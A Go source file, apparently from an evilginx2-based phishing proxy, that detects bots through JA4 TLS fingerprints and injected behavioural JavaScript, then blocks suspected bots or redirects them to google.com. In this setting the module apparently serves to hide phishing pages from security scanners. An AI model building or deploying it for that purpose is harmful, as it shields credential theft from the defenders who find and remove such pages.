package core

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// BotDetectionManager manages all bot detection functionality
type BotDetectionManager struct {
	ja4Detector         *JA4Detector
	behavioralAnalyzer  *BehavioralAnalyzer
	sessionBotData      map[string]*SessionBotData
	config              *BotDetectionConfig
	mutex               sync.RWMutex
	enabled             bool
}

// SessionBotData stores bot detection data for a session
type SessionBotData struct {
	SessionID           string
	JA4Result           *BotDetectionResult
	BehavioralResult    *BotDetectionResult
	CombinedResult      *BotDetectionResult
	CreatedAt           time.Time
	LastUpdated         time.Time
	BehavioralDataCount int
	IsBlocked           bool
	BlockReason         string
}

// BotDetectionConfig contains configuration for bot detection
type BotDetectionConfig struct {
	EnableJA4Detection        bool    `json:"enable_ja4_detection"`
	EnableBehavioralDetection bool    `json:"enable_behavioral_detection"`
	JA4BlockThreshold         float64 `json:"ja4_block_threshold"`
	BehavioralBlockThreshold  float64 `json:"behavioral_block_threshold"`
	CombinedBlockThreshold    float64 `json:"combined_block_threshold"`
	BlockAction               string  `json:"block_action"` // "block", "redirect", "rate_limit"
	RedirectURL               string  `json:"redirect_url"`
	LogBotActivity            bool    `json:"log_bot_activity"`
	AlertOnBotDetection       bool    `json:"alert_on_bot_detection"`
	SessionTimeout            int     `json:"session_timeout"` // minutes
}

// NewBotDetectionManager creates a new bot detection manager
func NewBotDetectionManager() *BotDetectionManager {
	config := &BotDetectionConfig{
		EnableJA4Detection:        true,
		EnableBehavioralDetection: true,
		JA4BlockThreshold:         0.7,
		BehavioralBlockThreshold:  0.6,
		CombinedBlockThreshold:    0.6,
		BlockAction:               "block",
		RedirectURL:               "https://www.google.com",
		LogBotActivity:            true,
		AlertOnBotDetection:       true,
		SessionTimeout:            30,
	}

	return &BotDetectionManager{
		ja4Detector:        NewJA4Detector(),
		behavioralAnalyzer: NewBehavioralAnalyzer(),
		sessionBotData:     make(map[string]*SessionBotData),
		config:             config,
		enabled:            true,
	}
}

// AnalyzeRequest performs initial bot detection on incoming request
func (bdm *BotDetectionManager) AnalyzeRequest(req *http.Request, clientHello *tls.ClientHelloInfo, sessionID string) *BotDetectionResult {
	if !bdm.enabled {
		return &BotDetectionResult{
			IsBot:       false,
			Confidence:  0.0,
			BlockAction: "allow",
		}
	}

	bdm.mutex.Lock()
	defer bdm.mutex.Unlock()

	// Create session bot data if it doesn't exist
	if _, exists := bdm.sessionBotData[sessionID]; !exists {
		bdm.sessionBotData[sessionID] = &SessionBotData{
			SessionID:   sessionID,
			CreatedAt:   time.Now(),
			LastUpdated: time.Now(),
		}
	}

	sessionData := bdm.sessionBotData[sessionID]

	// Perform JA4 analysis if enabled
	if bdm.config.EnableJA4Detection {
		// Extract headers from request
		headers := make(map[string][]string)
		for name, values := range req.Header {
			headers[name] = values
		}

		// Generate JA4 fingerprint
		var ja4Fingerprint *JA4Fingerprint
		if clientHello != nil {
			ja4Fingerprint = bdm.ja4Detector.GenerateJA4Fingerprint(clientHello)
		}

		// Analyze for bot patterns
		ja4Result := bdm.ja4Detector.DetectBot(ja4Fingerprint, headers)
		sessionData.JA4Result = ja4Result

		if bdm.config.LogBotActivity && ja4Result.IsBot {
			log.Warning("[BOT] JA4 Detection - Session: %s, Confidence: %.2f, Reasons: %v", 
				sessionID, ja4Result.Confidence, ja4Result.Reasons)
		}

		// Check if we should block based on JA4 alone
		if ja4Result.Confidence >= bdm.config.JA4BlockThreshold {
			sessionData.IsBlocked = true
			sessionData.BlockReason = "JA4 fingerprint analysis"
			
			if bdm.config.AlertOnBotDetection {
				bdm.alertBotDetection(sessionID, "JA4", ja4Result)
			}
			
			return ja4Result
		}
	}

	// Calculate combined result if we have JA4 data
	if sessionData.JA4Result != nil {
		sessionData.CombinedResult = bdm.calculateCombinedResult(sessionData)
		
		if sessionData.CombinedResult.Confidence >= bdm.config.CombinedBlockThreshold {
			sessionData.IsBlocked = true
			sessionData.BlockReason = "Combined analysis"
			
			if bdm.config.AlertOnBotDetection {
				bdm.alertBotDetection(sessionID, "Combined", sessionData.CombinedResult)
			}
			
			return sessionData.CombinedResult
		}
	}

	sessionData.LastUpdated = time.Now()

	// Return current best result
	if sessionData.CombinedResult != nil {
		return sessionData.CombinedResult
	}
	if sessionData.JA4Result != nil {
		return sessionData.JA4Result
	}

	return &BotDetectionResult{
		IsBot:       false,
		Confidence:  0.0,
		BlockAction: "allow",
	}
}

// ProcessBehavioralData processes behavioral data from JavaScript
func (bdm *BotDetectionManager) ProcessBehavioralData(jsonData string) *BotDetectionResult {
	if !bdm.enabled || !bdm.config.EnableBehavioralDetection {
		return &BotDetectionResult{
			IsBot:       false,
			Confidence:  0.0,
			BlockAction: "allow",
		}
	}

	// Parse behavioral data
	behavioralData, err := bdm.behavioralAnalyzer.ParseBehavioralData(jsonData)
	if err != nil {
		log.Error("[BOT] Failed to parse behavioral data: %v", err)
		return &BotDetectionResult{
			IsBot:       false,
			Confidence:  0.0,
			BlockAction: "allow",
		}
	}

	bdm.mutex.Lock()
	defer bdm.mutex.Unlock()

	sessionID := behavioralData.SessionID
	
	// Get or create session data
	if _, exists := bdm.sessionBotData[sessionID]; !exists {
		bdm.sessionBotData[sessionID] = &SessionBotData{
			SessionID:   sessionID,
			CreatedAt:   time.Now(),
			LastUpdated: time.Now(),
		}
	}

	sessionData := bdm.sessionBotData[sessionID]
	sessionData.BehavioralDataCount++

	// Analyze behavioral data
	behavioralResult := bdm.behavioralAnalyzer.AnalyzeBehavioralData(behavioralData)
	sessionData.BehavioralResult = behavioralResult

	if bdm.config.LogBotActivity && behavioralResult.IsBot {
		log.Warning("[BOT] Behavioral Detection - Session: %s, Confidence: %.2f, Reasons: %v", 
			sessionID, behavioralResult.Confidence, behavioralResult.Reasons)
	}

	// Calculate combined result
	sessionData.CombinedResult = bdm.calculateCombinedResult(sessionData)

	// Check if we should block
	if sessionData.CombinedResult.Confidence >= bdm.config.CombinedBlockThreshold {
		sessionData.IsBlocked = true
		sessionData.BlockReason = "Behavioral analysis"
		
		if bdm.config.AlertOnBotDetection {
			bdm.alertBotDetection(sessionID, "Behavioral", sessionData.CombinedResult)
		}
	}

	sessionData.LastUpdated = time.Now()
	return sessionData.CombinedResult
}

// calculateCombinedResult combines JA4 and behavioral analysis results
func (bdm *BotDetectionManager) calculateCombinedResult(sessionData *SessionBotData) *BotDetectionResult {
	result := &BotDetectionResult{
		IsBot:       false,
		Confidence:  0.0,
		Reasons:     []string{},
		BlockAction: "allow",
	}

	var totalConfidence float64
	var weights float64

	// Weight JA4 results
	if sessionData.JA4Result != nil {
		ja4Weight := 0.6 // JA4 gets 60% weight
		totalConfidence += sessionData.JA4Result.Confidence * ja4Weight
		weights += ja4Weight
		
		for _, reason := range sessionData.JA4Result.Reasons {
			result.Reasons = append(result.Reasons, "JA4:"+reason)
		}
	}

	// Weight behavioral results
	if sessionData.BehavioralResult != nil {
		behavioralWeight := 0.4 // Behavioral gets 40% weight
		totalConfidence += sessionData.BehavioralResult.Confidence * behavioralWeight
		weights += behavioralWeight
		
		for _, reason := range sessionData.BehavioralResult.Reasons {
			result.Reasons = append(result.Reasons, "Behavioral:"+reason)
		}
	}

	// Calculate weighted average
	if weights > 0 {
		result.Confidence = totalConfidence / weights
	}

	// Determine if it's a bot
	result.IsBot = result.Confidence >= bdm.config.CombinedBlockThreshold

	// Determine block action
	if result.Confidence >= 0.8 {
		result.BlockAction = "block"
	} else if result.Confidence >= 0.6 {
		result.BlockAction = "rate_limit"
	} else if result.Confidence >= 0.4 {
		result.BlockAction = "monitor"
	} else {
		result.BlockAction = "allow"
	}

	return result
}

// IsSessionBlocked checks if a session is blocked
func (bdm *BotDetectionManager) IsSessionBlocked(sessionID string) bool {
	bdm.mutex.RLock()
	defer bdm.mutex.RUnlock()

	if sessionData, exists := bdm.sessionBotData[sessionID]; exists {
		return sessionData.IsBlocked
	}
	return false
}

// GetSessionBotData returns bot detection data for a session
func (bdm *BotDetectionManager) GetSessionBotData(sessionID string) *SessionBotData {
	bdm.mutex.RLock()
	defer bdm.mutex.RUnlock()

	if sessionData, exists := bdm.sessionBotData[sessionID]; exists {
		return sessionData
	}
	return nil
}

// InjectBehavioralJS injects JavaScript for behavioral detection
func (bdm *BotDetectionManager) InjectBehavioralJS(sessionID string, htmlContent []byte) []byte {
	if !bdm.enabled || !bdm.config.EnableBehavioralDetection {
		return htmlContent
	}

	// Generate behavioral JavaScript
	behavioralJS := bdm.behavioralAnalyzer.GenerateBehavioralJS(sessionID)

	// Find insertion point (before </head> or </body>)
	htmlStr := string(htmlContent)
	
	insertionPoint := strings.Index(strings.ToLower(htmlStr), "</head>")
	if insertionPoint == -1 {
		insertionPoint = strings.Index(strings.ToLower(htmlStr), "</body>")
	}
	
	if insertionPoint != -1 {
		// Insert the JavaScript before the closing tag
		modifiedHTML := htmlStr[:insertionPoint] + behavioralJS + htmlStr[insertionPoint:]
		return []byte(modifiedHTML)
	}

	// If no suitable insertion point found, append to the end
	return append(htmlContent, []byte(behavioralJS)...)
}

// HandleBehavioralDataEndpoint handles the behavioral data endpoint
func (bdm *BotDetectionManager) HandleBehavioralDataEndpoint(w http.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read the request body
	body, err := io.ReadAll(req.Body)
	if err != nil {
		log.Error("[BOT] Failed to read behavioral data: %v", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	// Process the behavioral data
	result := bdm.ProcessBehavioralData(string(body))

	// Return response
	w.Header().Set("Content-Type", "application/json")
	response := map[string]interface{}{
		"status":     "ok",
		"is_bot":     result.IsBot,
		"confidence": result.Confidence,
		"action":     result.BlockAction,
	}

	json.NewEncoder(w).Encode(response)
}

// alertBotDetection sends alerts when bots are detected
func (bdm *BotDetectionManager) alertBotDetection(sessionID, detectionType string, result *BotDetectionResult) {
	message := fmt.Sprintf("[BOT DETECTED] Type: %s, Session: %s, Confidence: %.2f, Reasons: %v", 
		detectionType, sessionID, result.Confidence, result.Reasons)
	
	log.Warning(message)
	// Additional alerting mechanisms can be added here (webhook, email, etc.)
}

// CleanupExpiredSessions removes old session data
func (bdm *BotDetectionManager) CleanupExpiredSessions() {
	bdm.mutex.Lock()
	defer bdm.mutex.Unlock()

	timeout := time.Duration(bdm.config.SessionTimeout) * time.Minute
	cutoff := time.Now().Add(-timeout)

	for sessionID, sessionData := range bdm.sessionBotData {
		if sessionData.LastUpdated.Before(cutoff) {
			delete(bdm.sessionBotData, sessionID)
		}
	}
}

// UpdateConfig updates the bot detection configuration
func (bdm *BotDetectionManager) UpdateConfig(config *BotDetectionConfig) {
	bdm.mutex.Lock()
	defer bdm.mutex.Unlock()
	bdm.config = config
}

// GetConfig returns the current configuration
func (bdm *BotDetectionManager) GetConfig() *BotDetectionConfig {
	bdm.mutex.RLock()
	defer bdm.mutex.RUnlock()
	return bdm.config
}

// Enable enables bot detection
func (bdm *BotDetectionManager) Enable() {
	bdm.mutex.Lock()
	defer bdm.mutex.Unlock()
	bdm.enabled = true
}

// Disable disables bot detection
func (bdm *BotDetectionManager) Disable() {
	bdm.mutex.Lock()
	defer bdm.mutex.Unlock()
	bdm.enabled = false
}

// IsEnabled returns whether bot detection is enabled
func (bdm *BotDetectionManager) IsEnabled() bool {
	bdm.mutex.RLock()
	defer bdm.mutex.RUnlock()
	return bdm.enabled
}

// GetStats returns bot detection statistics
func (bdm *BotDetectionManager) GetStats() map[string]interface{} {
	bdm.mutex.RLock()
	defer bdm.mutex.RUnlock()

	totalSessions := len(bdm.sessionBotData)
	blockedSessions := 0
	ja4Detections := 0
	behavioralDetections := 0

	for _, sessionData := range bdm.sessionBotData {
		if sessionData.IsBlocked {
			blockedSessions++
		}
		if sessionData.JA4Result != nil && sessionData.JA4Result.IsBot {
			ja4Detections++
		}
		if sessionData.BehavioralResult != nil && sessionData.BehavioralResult.IsBot {
			behavioralDetections++
		}
	}

	return map[string]interface{}{
		"total_sessions":        totalSessions,
		"blocked_sessions":      blockedSessions,
		"ja4_detections":        ja4Detections,
		"behavioral_detections": behavioralDetections,
		"enabled":               bdm.enabled,
	}
}

